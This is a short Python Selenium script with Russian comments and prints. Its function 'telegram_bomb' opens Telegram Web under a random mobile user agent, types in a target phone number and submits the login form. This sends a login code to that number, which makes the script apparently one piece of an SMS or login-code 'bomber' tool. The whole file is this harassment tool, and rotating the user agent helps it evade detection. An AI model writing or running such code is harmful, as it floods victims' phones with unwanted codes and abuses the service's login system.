import random
import time
from selenium import webdriver
from selenium.webdriver.common.by import By

def telegram_bomb(nomer=None):
    print(f"Начал рфботу с номером {nomer}")
    with open("User_agent/SeoLik_Список_mobile_user_agent.txt", "r") as user_agent_file:
        user_agents_list = list(user_agent_file)
    #options
    options = webdriver.ChromeOptions()
    options.add_argument(f"user-agent={random.choice(user_agents_list)}")
    #options.add_argument("--headless")
    url = "https://web.telegram.org/k/"
    driver = webdriver.Chrome(options=options)
    driver.get(url)
    try:
        driver.implicitly_wait(10)
        knopka = driver.find_element(By.XPATH, "/html/body/div[1]/div/div[2]/div[3]/div/div[2]/button[1]/div").click()
    except Exception as knopka_1:
        print("telegram: knopka_1")
    try:
        driver.implicitly_wait(10)
        nomer = driver.find_element(By.XPATH, "/html/body/div[1]/div/div[2]/div[2]/div/div[3]/div[2]/div[1]").send_keys(nomer)
    except Exception as nomer_1:
        print("telegram: nomer")
    try:
        driver.implicitly_wait(10)
        vvesti = driver.find_element(By.XPATH, "/html/body/div[1]/div/div[2]/div[2]/div/div[3]/button[1]").click()
    except Exception as vvesti_1:
        print("telegram: vvesti_1")
    time.sleep(2)
    driver.quit()


def main():
    telegram_bomb()

if __name__ == "__main__":
    main()